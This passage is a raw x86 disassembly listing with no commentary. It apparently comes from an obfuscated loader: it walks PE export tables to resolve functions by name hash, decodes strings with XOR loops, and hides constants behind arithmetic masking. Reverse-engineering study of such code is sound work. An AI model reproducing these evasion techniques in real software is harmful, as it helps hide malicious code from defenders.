  41d787:	jne    0x41d795
  41d789:	mov    ebx,DWORD PTR [ebp+0x8]
  41d78c:	movzx  edi,dx
  41d78f:	cmp    BYTE PTR [edi+ebx*1],0x0
  41d793:	je     0x41d7c2
  41d795:	mov    ebx,DWORD PTR [ebp+0x8]
  41d798:	movzx  edi,dx
  41d79b:	movsx  di,BYTE PTR [edi+ebx*1]
  41d7a0:	mov    ebx,0x3b50
  41d7a5:	sub    di,bx
  41d7a8:	xor    di,ax
  41d7ab:	cmp    cx,di
  41d7ae:	je     0x41d7c2
  41d7b0:	push   0x7a
  41d7b2:	pop    edi
  41d7b3:	inc    DWORD PTR [ebp-0x4]
  41d7b6:	mov    cx,WORD PTR [ebp-0xc]
  41d7ba:	cmp    WORD PTR [ebp-0x4],cx
  41d7be:	jb     0x41d76c
  41d7c0:	jmp    0x41d7c8
  41d7c2:	inc    DWORD PTR [ebp-0x8]
  41d7c5:	push   0x79
  41d7c7:	pop    edi
  41d7c8:	mov    esi,DWORD PTR [ebp+0x8]
  41d7cb:	movzx  ecx,dx
  41d7ce:	cmp    BYTE PTR [ecx+esi*1],0x0
  41d7d2:	je     0x41d7e7
  41d7d4:	inc    edx
  41d7d5:	cmp    edi,0x7a
  41d7d8:	jne    0x41d755
  41d7de:	xor    eax,eax
  41d7e0:	pop    edi
  41d7e1:	pop    esi
  41d7e2:	pop    ebx
  41d7e3:	leave  
  41d7e4:	ret    0x8
  41d7e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41d7ea:	add    ecx,0xffffc4b0
  41d7f0:	xor    cx,ax
  41d7f3:	xor    eax,eax
  41d7f5:	cmp    cx,WORD PTR [ebp-0x10]
  41d7f9:	sete   al
  41d7fc:	jmp    0x41d7e0
  41d7fe:	push   ebp
  41d7ff:	mov    ebp,esp
  41d801:	sub    esp,0x50
  41d804:	push   edi
  41d805:	mov    edi,eax
  41d807:	mov    eax,DWORD PTR [edi+0x1a8]
  41d80d:	cmp    DWORD PTR [eax],0x0
  41d810:	jne    0x41d819
  41d812:	xor    eax,eax
  41d814:	jmp    0x41d94a
  41d819:	push   DWORD PTR [ebp+0x8]
  41d81c:	push   0x2c
  41d81e:	pop    eax
  41d81f:	call   0x41d5ae
  41d824:	mov    edx,DWORD PTR [edi+0x1ac]
  41d82a:	lea    eax,[edi+0x22]
  41d82d:	mov    DWORD PTR [ebp-0x4c],eax
  41d830:	lea    eax,[edi+0x44]
  41d833:	mov    DWORD PTR [ebp-0x48],eax
  41d836:	lea    eax,[edi+0x66]
  41d839:	mov    DWORD PTR [ebp-0x44],eax
  41d83c:	lea    eax,[edi+0x88]
  41d842:	mov    DWORD PTR [ebp-0x40],eax
  41d845:	lea    eax,[edi+0xaa]
  41d84b:	mov    DWORD PTR [ebp-0x3c],eax
  41d84e:	lea    eax,[edi+0xcc]
  41d854:	mov    DWORD PTR [ebp-0x38],eax
  41d857:	lea    eax,[edi+0xee]
  41d85d:	mov    DWORD PTR [ebp-0x34],eax
  41d860:	lea    eax,[edi+0x110]
  41d866:	mov    DWORD PTR [ebp-0x30],eax
  41d869:	lea    eax,[edi+0x132]
  41d86f:	mov    DWORD PTR [ebp-0x2c],eax
  41d872:	lea    eax,[edi+0x154]
  41d878:	push   edi
  41d879:	mov    DWORD PTR [ebp-0x50],edi
  41d87c:	mov    DWORD PTR [ebp-0x28],eax
  41d87f:	call   0x41d97e
  41d884:	push   eax
  41d885:	mov    eax,DWORD PTR [edi+0x1a8]
  41d88b:	push   DWORD PTR [eax]
  41d88d:	call   0x41d61f
  41d892:	mov    DWORD PTR [ebp-0x10],eax
  41d895:	test   eax,eax
  41d897:	je     0x41d94a
  41d89d:	mov    ecx,DWORD PTR [eax+0x3c]
  41d8a0:	push   ebx
  41d8a1:	push   esi
  41d8a2:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41d8a6:	add    esi,eax
  41d8a8:	mov    edi,DWORD PTR [esi+0x24]
  41d8ab:	mov    ecx,DWORD PTR [esi+0x1c]
  41d8ae:	mov    edx,DWORD PTR [esi+0x20]
  41d8b1:	mov    ebx,DWORD PTR [esi+0x18]
  41d8b4:	add    edi,eax
  41d8b6:	mov    DWORD PTR [ebp-0x20],edi
  41d8b9:	mov    edi,DWORD PTR [esi+0x14]
  41d8bc:	add    ecx,eax
  41d8be:	add    edx,eax
  41d8c0:	mov    DWORD PTR [ebp-0xc],ecx
  41d8c3:	mov    DWORD PTR [ebp-0x1c],edx
  41d8c6:	mov    DWORD PTR [ebp-0x8],edi
  41d8c9:	cmp    edi,ebx
  41d8cb:	ja     0x41d8d0
  41d8cd:	mov    DWORD PTR [ebp-0x8],ebx
  41d8d0:	xor    ebx,ebx
  41d8d2:	mov    DWORD PTR [ebp-0x18],ebx
  41d8d5:	cmp    DWORD PTR [ebp-0x8],ebx
  41d8d8:	jbe    0x41d948
  41d8da:	jmp    0x41d8df
  41d8dc:	mov    edx,DWORD PTR [ebp-0x1c]
  41d8df:	mov    edi,DWORD PTR [ebp-0x20]
  41d8e2:	movzx  edi,WORD PTR [edi+ebx*2]
  41d8e6:	cmp    ebx,DWORD PTR [esi+0x18]
  41d8e9:	jae    0x41d948
  41d8eb:	cmp    edi,DWORD PTR [esi+0x14]
  41d8ee:	jae    0x41d948
  41d8f0:	mov    ebx,DWORD PTR [edx+ebx*4]
  41d8f3:	mov    edx,DWORD PTR [ebp+0x8]
  41d8f6:	mov    edi,DWORD PTR [ecx+edi*4]
  41d8f9:	mov    DWORD PTR [ebp-0x4],edx
  41d8fc:	lea    edx,[ebp-0x50]
  41d8ff:	add    ebx,eax
  41d901:	add    edi,eax
  41d903:	sub    edx,DWORD PTR [ebp+0x8]
  41d906:	mov    DWORD PTR [ebp-0x14],0xb
  41d90d:	mov    DWORD PTR [ebp-0x24],edx
  41d910:	mov    edx,DWORD PTR [ebp-0x4]
  41d913:	cmp    DWORD PTR [edx],0x0
  41d916:	jne    0x41d933
  41d918:	mov    eax,DWORD PTR [ebp-0x24]
  41d91b:	push   DWORD PTR [eax+edx*1]
  41d91e:	push   ebx
  41d91f:	call   0x41d719
  41d924:	mov    ecx,DWORD PTR [ebp-0xc]
  41d927:	test   eax,eax
  41d929:	je     0x41d930
  41d92b:	mov    eax,DWORD PTR [ebp-0x4]
  41d92e:	mov    DWORD PTR [eax],edi
  41d930:	mov    eax,DWORD PTR [ebp-0x10]
  41d933:	add    DWORD PTR [ebp-0x4],0x4
  41d937:	dec    DWORD PTR [ebp-0x14]
  41d93a:	jne    0x41d910
  41d93c:	mov    ebx,DWORD PTR [ebp-0x18]
  41d93f:	inc    ebx
  41d940:	mov    DWORD PTR [ebp-0x18],ebx
  41d943:	cmp    ebx,DWORD PTR [ebp-0x8]
  41d946:	jb     0x41d8dc
  41d948:	pop    esi
  41d949:	pop    ebx
  41d94a:	pop    edi
  41d94b:	leave  
  41d94c:	ret    0x4
  41d94f:	push   ebp
  41d950:	mov    ebp,esp
  41d952:	mov    eax,DWORD PTR [ebp+0x8]
  41d955:	push   esi
  41d956:	push   DWORD PTR [eax+0x1d8]
  41d95c:	lea    esi,[eax+0x198]
  41d962:	mov    eax,DWORD PTR [ebp+0x8]
  41d965:	call   0x41d7fe
  41d96a:	mov    ecx,DWORD PTR [esi]
  41d96c:	mov    DWORD PTR [ecx],eax
  41d96e:	mov    eax,DWORD PTR [esi]
  41d970:	xor    ecx,ecx
  41d972:	cmp    DWORD PTR [eax],ecx
  41d974:	pop    esi
  41d975:	setne  cl
  41d978:	mov    eax,ecx
  41d97a:	pop    ebp
  41d97b:	ret    0x4
  41d97e:	mov    ecx,DWORD PTR [edi+0x188]
  41d984:	push   ebx
  41d985:	jmp    0x41d99a
  41d987:	xor    eax,0x8a8c
  41d98c:	add    eax,0x3b50
  41d991:	mov    WORD PTR [ecx],ax
  41d994:	add    ecx,0x2
  41d997:	add    edx,0x2
  41d99a:	movzx  eax,WORD PTR [edx]
  41d99d:	mov    ebx,0x4e3c
  41d9a2:	cmp    ax,bx
  41d9a5:	jne    0x41d987
  41d9a7:	xor    eax,eax
  41d9a9:	mov    WORD PTR [ecx],ax
  41d9ac:	mov    eax,DWORD PTR [edi+0x188]
  41d9b2:	pop    ebx
  41d9b3:	ret    
  41d9b4:	push   edi
  41d9b5:	mov    edi,eax
  41d9b7:	mov    eax,DWORD PTR [esi+0x188]
  41d9bd:	shl    edi,0x6
  41d9c0:	add    eax,edi
  41d9c2:	jmp    0x41d9ce
  41d9c4:	xor    cl,0x73
  41d9c7:	sub    cl,0x9
  41d9ca:	mov    BYTE PTR [eax],cl
  41d9cc:	inc    eax
  41d9cd:	inc    edx
  41d9ce:	mov    cl,BYTE PTR [edx]
  41d9d0:	cmp    cl,0x7a
  41d9d3:	jne    0x41d9c4
  41d9d5:	mov    BYTE PTR [eax],0x0
  41d9d8:	mov    eax,DWORD PTR [esi+0x188]
  41d9de:	add    eax,edi
  41d9e0:	pop    edi
  41d9e1:	ret    
  41d9e2:	push   ebp
  41d9e3:	mov    ebp,esp
  41d9e5:	sub    esp,0x38
  41d9e8:	push   ebx
  41d9e9:	mov    ebx,0xf89c85b9
  41d9ee:	mov    DWORD PTR [ebp-0x4],ebx
  41d9f1:	lea    eax,[ebx-0x1]
  41d9f4:	push   esi
  41d9f5:	mov    DWORD PTR [ebp-0x24],eax
  41d9f8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d9fb:	mov    edx,DWORD PTR [ebp+0x8]
  41d9fe:	mov    esi,0x7510899
  41da03:	push   edi
  41da04:	xor    ecx,esi
  41da06:	mov    edi,0x3272e0
  41da0b:	add    ecx,edi
  41da0d:	cmp    edx,ecx
  41da0f:	je     0x41db7d
  41da15:	mov    ecx,DWORD PTR [ebp-0x4]
  41da18:	mov    edx,DWORD PTR [ebp+0xc]
  41da1b:	xor    ecx,esi
  41da1d:	add    ecx,edi
  41da1f:	cmp    edx,ecx
  41da21:	je     0x41db7d
  41da27:	mov    ecx,DWORD PTR [ebp+0x10]
  41da2a:	mov    DWORD PTR [ebp-0x18],ecx
  41da2d:	mov    ecx,DWORD PTR [ebp+0xc]
  41da30:	mov    DWORD PTR [ebp-0x14],ecx
  41da33:	mov    ecx,DWORD PTR [ebp+0x8]
  41da36:	mov    DWORD PTR [ebp-0x1c],0xf89c8504
  41da3d:	mov    DWORD PTR [ebp-0x20],eax
  41da40:	mov    DWORD PTR [ebp-0x10],ebx
  41da43:	mov    DWORD PTR [ebp+0xc],eax
  41da46:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41da4d:	mov    eax,DWORD PTR [ebp+0xc]
  41da50:	mov    DWORD PTR [ebp-0xc],ecx
  41da53:	xor    eax,esi
  41da55:	mov    ecx,0xffcd8d20
  41da5a:	sub    ecx,eax
  41da5c:	add    ecx,DWORD PTR [ebp-0x14]
  41da5f:	mov    DWORD PTR [ebp+0x8],ecx
  41da62:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  41da69:	jmp    0x41db6d
  41da6e:	mov    eax,DWORD PTR [ebp+0xc]
  41da71:	mov    ecx,DWORD PTR [ebp+0xc]
  41da74:	xor    eax,esi
  41da76:	xor    ecx,esi
  41da78:	lea    ecx,[eax+ecx*1+0x64e5c0]
  41da7f:	mov    eax,DWORD PTR [ebp+0x8]
  41da82:	xor    edx,edx
  41da84:	div    ecx
  41da86:	mov    eax,DWORD PTR [ebp+0x10]
  41da89:	mov    ecx,DWORD PTR [ebp+0xc]
  41da8c:	xor    eax,esi
  41da8e:	xor    ecx,esi
  41da90:	sub    eax,ecx
  41da92:	cmp    edx,eax
  41da94:	jne    0x41db29
  41da9a:	mov    eax,DWORD PTR [ebp+0x8]
  41da9d:	add    eax,DWORD PTR [ebp-0xc]
  41daa0:	mov    dl,BYTE PTR [eax]
  41daa2:	mov    eax,DWORD PTR [ebp-0x10]
  41daa5:	mov    ecx,DWORD PTR [ebp-0x8]
  41daa8:	xor    eax,esi
  41daaa:	xor    ecx,esi
  41daac:	add    eax,edi
  41daae:	add    ecx,edi
  41dab0:	cmp    eax,ecx
  41dab2:	jae    0x41dafa
  41dab4:	lea    ecx,[eax-0x3272e0]
  41daba:	mov    DWORD PTR [ebp-0x4],ecx
  41dabd:	mov    ebx,DWORD PTR [ebp-0x4]
  41dac0:	xor    ebx,esi
  41dac2:	add    ebx,0x7f55d8fb
  41dac8:	lea    ecx,[ebp+eax*4-0x38]
  41dacc:	mov    DWORD PTR [ecx],ebx
  41dace:	mov    ebx,DWORD PTR [ecx]
  41dad0:	cmp    ebx,0x244ecbda
  41dad6:	jbe    0x41dae0
  41dad8:	add    DWORD PTR [ecx],0x405fc1d
  41dade:	jmp    0x41dae6
  41dae0:	add    DWORD PTR [ecx],0xfdaf43e3
  41dae6:	mov    ecx,DWORD PTR [ebp-0x8]
  41dae9:	xor    ecx,esi
  41daeb:	inc    eax
  41daec:	inc    DWORD PTR [ebp-0x4]
  41daef:	add    ecx,edi
  41daf1:	cmp    eax,ecx
  41daf3:	jb     0x41dabd
  41daf5:	mov    ebx,0xf89c85b9
  41dafa:	mov    eax,DWORD PTR [ebp-0x18]
  41dafd:	test   eax,eax
  41daff:	jne    0x41db09
  41db01:	xor    dl,0x73
  41db04:	sub    dl,0x9
  41db07:	jmp    0x41db1f
  41db09:	mov    eax,DWORD PTR [ebp-0x1c]
  41db0c:	xor    al,0x99
  41db0e:	mov    cl,0x20
  41db10:	sub    cl,al
  41db12:	add    dl,cl
  41db14:	mov    ecx,DWORD PTR [ebp-0x20]
  41db17:	xor    cl,0x99
  41db1a:	sub    cl,0x20
  41db1d:	ror    dl,cl
  41db1f:	xor    eax,eax
  41db21:	mov    eax,DWORD PTR [ebp+0x8]
  41db24:	add    eax,DWORD PTR [ebp-0xc]
  41db27:	mov    BYTE PTR [eax],dl
  41db29:	mov    eax,DWORD PTR [ebp+0x8]
  41db2c:	mov    ecx,DWORD PTR [ebp-0x10]
  41db2f:	sub    eax,edi
  41db31:	xor    eax,esi
  41db33:	cmp    eax,ecx
  41db35:	jne    0x41db5b
  41db37:	mov    eax,DWORD PTR [ebp+0x10]
  41db3a:	mov    ecx,DWORD PTR [ebp+0xc]
  41db3d:	xor    eax,esi
  41db3f:	xor    ecx,esi
  41db41:	sub    eax,ecx
  41db43:	sub    eax,edi
  41db45:	xor    eax,esi
  41db47:	mov    DWORD PTR [ebp+0x10],eax
  41db4a:	mov    eax,DWORD PTR [ebp+0xc]
  41db4d:	xor    eax,esi
  41db4f:	mov    ecx,0xffcd8d20
  41db54:	sub    ecx,eax
  41db56:	add    ecx,DWORD PTR [ebp-0x14]
  41db59:	jmp    0x41db6a
  41db5b:	mov    eax,DWORD PTR [ebp+0xc]
  41db5e:	xor    eax,esi
  41db60:	mov    ecx,0xffcd8d20
  41db65:	sub    ecx,eax
  41db67:	add    ecx,DWORD PTR [ebp+0x8]
  41db6a:	mov    DWORD PTR [ebp+0x8],ecx
  41db6d:	mov    eax,DWORD PTR [ebp+0x10]
  41db70:	cmp    eax,ebx
  41db72:	jne    0x41da6e
  41db78:	mov    eax,DWORD PTR [ebp-0x24]
  41db7b:	jmp    0x41db80
  41db7d:	mov    eax,DWORD PTR [ebp-0x4]
  41db80:	xor    eax,esi
  41db82:	add    eax,edi
  41db84:	pop    edi
  41db85:	pop    esi
  41db86:	pop    ebx
  41db87:	leave  
  41db88:	ret    0xc
  41db8b:	push   ebp
  41db8c:	mov    ebp,esp
  41db8e:	sub    esp,0x14
  41db91:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  41db98:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  41db9f:	mov    eax,DWORD PTR [ebx]
  41dba1:	mov    DWORD PTR [ebp-0x8],eax
  41dba4:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  41dbab:	push   esi
  41dbac:	push   edi
  41dbad:	mov    DWORD PTR [ebp-0x14],0xead718d9
  41dbb4:	mov    edi,DWORD PTR [ebp-0x4]
  41dbb7:	mov    ecx,DWORD PTR [ebp-0x10]
  41dbba:	mov    eax,0x7510899
  41dbbf:	xor    edi,eax
  41dbc1:	mov    edx,0x3272e0
  41dbc6:	xor    ecx,eax
  41dbc8:	add    edi,edx
  41dbca:	add    ecx,edx
  41dbcc:	imul   edi,ecx
  41dbcf:	jmp    0x41dc17
  41dbd1:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbd4:	mov    esi,DWORD PTR [ebp-0x4]
  41dbd7:	xor    ecx,eax
  41dbd9:	xor    esi,eax
  41dbdb:	add    ecx,edx
  41dbdd:	add    esi,edx
  41dbdf:	test   esi,ecx
  41dbe1:	mov    esi,DWORD PTR [ebp-0x8]
  41dbe4:	mov    ecx,DWORD PTR [ebp-0x4]
  41dbe7:	je     0x41dbfe
  41dbe9:	xor    ecx,eax
  41dbeb:	xor    esi,eax
  41dbed:	add    ecx,edx
  41dbef:	add    esi,edx
  41dbf1:	shr    esi,cl
  41dbf3:	mov    ecx,DWORD PTR [ebp-0x14]
  41dbf6:	xor    ecx,eax
  41dbf8:	add    ecx,edx
  41dbfa:	xor    esi,ecx
  41dbfc:	jmp    0x41dc08
  41dbfe:	xor    esi,eax
  41dc00:	xor    ecx,eax
  41dc02:	add    esi,edx
  41dc04:	add    ecx,edx
  41dc06:	shr    esi,cl
  41dc08:	mov    DWORD PTR [ebp-0x8],esi
  41dc0b:	mov    ecx,DWORD PTR [ebp-0x4]
  41dc0e:	xor    ecx,eax
  41dc10:	lea    edi,[edi+ecx*1+0x3272e0]
  41dc17:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc1a:	mov    esi,DWORD PTR [ebp-0x4]
  41dc1d:	xor    esi,eax
  41dc1f:	xor    ecx,eax
  41dc21:	sub    ecx,esi
  41dc23:	cmp    edi,ecx
  41dc25:	jbe    0x41dbd1
  41dc27:	mov    eax,DWORD PTR [ebp-0x8]
  41dc2a:	pop    edi
  41dc2b:	mov    DWORD PTR [ebx],eax
  41dc2d:	mov    eax,DWORD PTR [ebp-0x8]
  41dc30:	pop    esi
  41dc31:	leave  
  41dc32:	ret    
  41dc33:	push   ebp
  41dc34:	mov    ebp,esp
  41dc36:	sub    esp,0x420
  41dc3c:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41dc43:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  41dc4a:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  41dc51:	push   ebx
  41dc52:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41dc59:	mov    eax,DWORD PTR [ebp-0x14]
  41dc5c:	push   esi
  41dc5d:	mov    esi,0x7510899
  41dc62:	push   edi
  41dc63:	xor    eax,esi
  41dc65:	mov    edi,0x3272e0
  41dc6a:	add    eax,edi
  41dc6c:	mov    DWORD PTR [ebp-0x8],eax
  41dc6f:	mov    DWORD PTR [ebp-0x20],0xf89c85b1
  41dc76:	mov    DWORD PTR [ebp-0x4],0xead718d9
  41dc7d:	mov    DWORD PTR [ebp-0x10],0x8
  41dc84:	mov    ecx,ecx
  41dc86:	mov    eax,DWORD PTR [ebp-0xc]
  41dc89:	mov    ecx,DWORD PTR [ebp-0x14]
  41dc8c:	xor    eax,esi
  41dc8e:	xor    ecx,esi
  41dc90:	add    eax,edi
  41dc92:	add    ecx,edi
  41dc94:	imul   eax,ecx
  41dc97:	jmp    0x41dcca
  41dc99:	mov    eax,DWORD PTR [ebp-0x4]
  41dc9c:	sub    eax,edi
  41dc9e:	xor    eax,esi
  41dca0:	mov    DWORD PTR [ebp-0x8],eax
  41dca3:	lea    ebx,[ebp-0x8]
  41dca6:	call   0x41db8b
  41dcab:	mov    DWORD PTR [ebp-0x8],eax
  41dcae:	mov    eax,DWORD PTR [ebp-0x8]
  41dcb1:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcb4:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41dcbb:	mov    eax,DWORD PTR [ebp-0xc]
  41dcbe:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcc1:	xor    eax,esi
  41dcc3:	lea    eax,[eax+ecx*1+0x3272e0]
  41dcca:	mov    DWORD PTR [ebp-0x4],eax
  41dccd:	mov    eax,DWORD PTR [ebp-0x18]
  41dcd0:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcd3:	xor    ecx,esi
  41dcd5:	xor    eax,esi
  41dcd7:	sub    eax,ecx
  41dcd9:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcdc:	cmp    ecx,eax
  41dcde:	jbe    0x41dc99
  41dce0:	mov    eax,DWORD PTR [ebp-0x1c]
  41dce3:	xor    eax,esi
  41dce5:	add    eax,edi
  41dce7:	mov    DWORD PTR [ebp-0x8],eax
  41dcea:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41dcf1:	mov    ebx,ebx
  41dcf3:	jmp    0x41dd56
  41dcf5:	mov    ecx,DWORD PTR [ebp-0x20]
  41dcf8:	mov    eax,DWORD PTR [ebp-0x8]
  41dcfb:	xor    ecx,esi
  41dcfd:	add    ecx,edi
  41dcff:	shr    eax,cl
  41dd01:	mov    DWORD PTR [ebp-0x4],eax
  41dd04:	mov    eax,DWORD PTR [ebp+0x8]
  41dd07:	mov    cl,BYTE PTR [eax]
  41dd09:	mov    BYTE PTR [ebp+0xb],cl
  41dd0c:	mov    cl,BYTE PTR [ebp+0xb]
  41dd0f:	mov    edx,DWORD PTR [ebp-0x8]
  41dd12:	movzx  ecx,cl
  41dd15:	xor    ecx,edx
  41dd17:	mov    DWORD PTR [ebp+0x8],ecx
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd1d:	mov    edx,DWORD PTR [ebp+0x8]
  41dd20:	xor    ecx,esi
  41dd22:	add    ecx,edi
  41dd24:	and    ecx,edx
  41dd26:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41dd2d:	mov    edx,DWORD PTR [ebp-0x4]
  41dd30:	xor    ecx,edx
  41dd32:	mov    DWORD PTR [ebp-0x8],ecx
  41dd35:	mov    ecx,DWORD PTR [ebp-0xc]
  41dd38:	xor    ecx,esi
  41dd3a:	lea    eax,[eax+ecx*1+0x3272e0]
  41dd41:	mov    DWORD PTR [ebp+0x8],eax
  41dd44:	mov    eax,DWORD PTR [ebp-0xc]
  41dd47:	xor    eax,esi
  41dd49:	mov    ecx,0xffcd8d20
  41dd4e:	sub    ecx,eax
  41dd50:	add    ecx,DWORD PTR [ebp-0x10]
  41dd53:	mov    DWORD PTR [ebp-0x10],ecx
  41dd56:	mov    eax,DWORD PTR [ebp-0x14]
  41dd59:	mov    ecx,DWORD PTR [ebp-0x10]
  41dd5c:	xor    eax,esi
  41dd5e:	add    eax,edi
  41dd60:	cmp    ecx,eax
  41dd62:	jne    0x41dcf5
  41dd64:	mov    eax,DWORD PTR [ebp-0x1c]
  41dd67:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd6a:	xor    eax,esi
  41dd6c:	add    eax,edi
  41dd6e:	pop    edi
  41dd6f:	pop    esi
  41dd70:	xor    eax,ecx
  41dd72:	pop    ebx
  41dd73:	leave  
  41dd74:	ret    0x4
  41dd77:	push   ebp
  41dd78:	mov    ebp,esp
  41dd7a:	mov    eax,DWORD PTR [ebp+0x1c]
  41dd7d:	mov    ecx,DWORD PTR [ebp+0x8]
  41dd80:	mov    edx,DWORD PTR [ebp+0x10]
  41dd83:	mov    eax,DWORD PTR [eax+0x190]
  41dd89:	mov    eax,DWORD PTR [eax]
  41dd8b:	sub    esp,0x64
  41dd8e:	push   ebx
  41dd8f:	push   esi
  41dd90:	push   edi
  41dd91:	mov    edi,0x7510899
  41dd96:	xor    ecx,edi
  41dd98:	mov    ebx,0x3272e0
  41dd9d:	add    ecx,ebx
  41dd9f:	cmp    ecx,edx
  41dda1:	jne    0x41ddb2
  41dda3:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ddad:	jmp    0x41e2ae
  41ddb2:	mov    ecx,DWORD PTR [ebp+0x8]
  41ddb5:	mov    esi,DWORD PTR [ebp+0x14]
  41ddb8:	mov    edx,DWORD PTR [esi]
  41ddba:	xor    ecx,edi
  41ddbc:	add    ecx,ebx
  41ddbe:	cmp    edx,ecx
  41ddc0:	je     0x41e269
  41ddc6:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ddc9:	mov    DWORD PTR [ebp-0x1c],eax
  41ddcc:	mov    DWORD PTR [ebp+0x1c],ecx
  41ddcf:	mov    ecx,DWORD PTR [ebp+0x18]
  41ddd2:	mov    eax,DWORD PTR [esi]
  41ddd4:	mov    DWORD PTR [ebp-0x20],eax
  41ddd7:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  41ddde:	mov    edx,0xf89c85b8
  41dde3:	mov    DWORD PTR [ebp-0x8],edx
  41dde6:	mov    eax,DWORD PTR [ebp+0x1c]
  41dde9:	mov    DWORD PTR [ebp+0x1c],eax
  41ddec:	mov    eax,DWORD PTR [ebp+0x1c]
  41ddef:	mov    eax,DWORD PTR [eax+0x190]
  41ddf5:	mov    eax,DWORD PTR [eax]
  41ddf7:	mov    DWORD PTR [ebp-0x24],ecx
  41ddfa:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ddfd:	mov    ecx,DWORD PTR [ecx+0x190]
  41de03:	mov    ecx,DWORD PTR [ecx]
  41de05:	add    ecx,DWORD PTR [eax+0x3c]
  41de08:	mov    DWORD PTR [ebp+0x10],ecx
  41de0b:	mov    eax,DWORD PTR [ebp+0x8]
  41de0e:	xor    eax,edi
  41de10:	add    eax,ebx
  41de12:	mov    DWORD PTR [ebp-0x4],eax
  41de15:	mov    eax,DWORD PTR [ebp+0x8]
  41de18:	xor    eax,edi
  41de1a:	add    eax,ebx
  41de1c:	mov    DWORD PTR [ebp+0x18],eax
  41de1f:	mov    eax,DWORD PTR [ebp+0x10]
  41de22:	mov    eax,DWORD PTR [eax+0x50]
  41de25:	sub    eax,0xc
  41de28:	mov    DWORD PTR [ebp-0x28],eax
  41de2b:	mov    eax,DWORD PTR [ebp+0x10]
  41de2e:	mov    eax,DWORD PTR [eax+0x38]
  41de31:	mov    ecx,DWORD PTR [ebp+0x10]
  41de34:	dec    eax
  41de35:	test   DWORD PTR [ecx+0x54],eax
  41de38:	mov    eax,DWORD PTR [ebp+0x10]
  41de3b:	je     0x41de55
  41de3d:	mov    eax,DWORD PTR [eax+0x38]
  41de40:	mov    ecx,DWORD PTR [ebp+0x10]
  41de43:	mov    ecx,DWORD PTR [ecx+0x54]
  41de46:	dec    eax
  41de47:	not    eax
  41de49:	and    ecx,eax
  41de4b:	mov    eax,DWORD PTR [ebp+0x10]
  41de4e:	mov    eax,DWORD PTR [eax+0x38]
  41de51:	add    eax,ecx
  41de53:	jmp    0x41de58
  41de55:	mov    eax,DWORD PTR [eax+0x54]
  41de58:	mov    DWORD PTR [ebp+0x1c],eax
  41de5b:	mov    eax,DWORD PTR [ebp+0x8]
  41de5e:	xor    eax,edi
  41de60:	add    eax,ebx
  41de62:	mov    DWORD PTR [ebp+0x18],eax
  41de65:	mov    eax,DWORD PTR [ebp+0x8]
  41de68:	xor    eax,edi
  41de6a:	add    eax,ebx
  41de6c:	mov    DWORD PTR [ebp+0x18],eax
  41de6f:	mov    eax,DWORD PTR [ebp+0x8]
  41de72:	mov    ecx,DWORD PTR [ebp-0x24]
  41de75:	xor    eax,edi
  41de77:	add    eax,ebx
  41de79:	mov    DWORD PTR [ecx],eax
  41de7b:	mov    DWORD PTR [ebp+0x18],edx
  41de7e:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41de85:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  41de8c:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  41de93:	mov    eax,DWORD PTR [ebp-0x8]
  41de96:	mov    ecx,DWORD PTR [ebp+0x1c]
  41de99:	xor    eax,edi
  41de9b:	add    eax,ebx
  41de9d:	imul   eax,ecx
  41dea0:	mov    ecx,DWORD PTR [ebp+0x8]
  41dea3:	mov    edx,DWORD PTR [ebp-0x28]
  41dea6:	xor    ecx,edi
  41dea8:	lea    ecx,[ecx+edx*1+0x3272e0]
  41deaf:	cmp    eax,ecx
  41deb1:	jae    0x41e262
  41deb7:	mov    eax,DWORD PTR [ebp+0x8]
  41deba:	xor    eax,edi
  41debc:	add    eax,ebx
  41debe:	mov    DWORD PTR [ebp+0x18],eax
  41dec1:	mov    eax,DWORD PTR [ebp+0x1c]
  41dec4:	add    eax,DWORD PTR [ebp-0x1c]
  41dec7:	mov    DWORD PTR [ebp-0x4],eax
  41deca:	push   DWORD PTR [ebp-0x4]
  41decd:	mov    esi,DWORD PTR [ebp-0x1c]
  41ded0:	mov    ecx,DWORD PTR [ebp+0x10]
  41ded3:	call   0x41cfcb
  41ded8:	mov    DWORD PTR [ebp+0xc],eax
  41dedb:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  41dee2:	mov    eax,DWORD PTR [ebp-0x18]
  41dee5:	xor    eax,edi
  41dee7:	lea    ecx,[ebp-0x40]
  41deea:	add    eax,ebx
  41deec:	push   ecx
  41deed:	call   0x41d5ae
  41def2:	mov    eax,DWORD PTR [ebp+0xc]
  41def5:	test   eax,eax
  41def7:	je     0x41df47
  41def9:	mov    eax,DWORD PTR [ebp-0x18]
  41defc:	xor    eax,edi
  41defe:	add    eax,ebx
  41df00:	push   eax
  41df01:	push   DWORD PTR [ebp+0xc]
  41df04:	lea    eax,[ebp-0x40]
  41df07:	push   eax
  41df08:	call   0x41d455
  41df0d:	mov    eax,DWORD PTR [ebp-0x4]
  41df10:	mov    DWORD PTR [ebp-0x18],eax
  41df13:	mov    eax,DWORD PTR [ebp-0x18]
  41df16:	mov    ecx,DWORD PTR [ebp-0x1c]
  41df19:	sub    eax,ecx
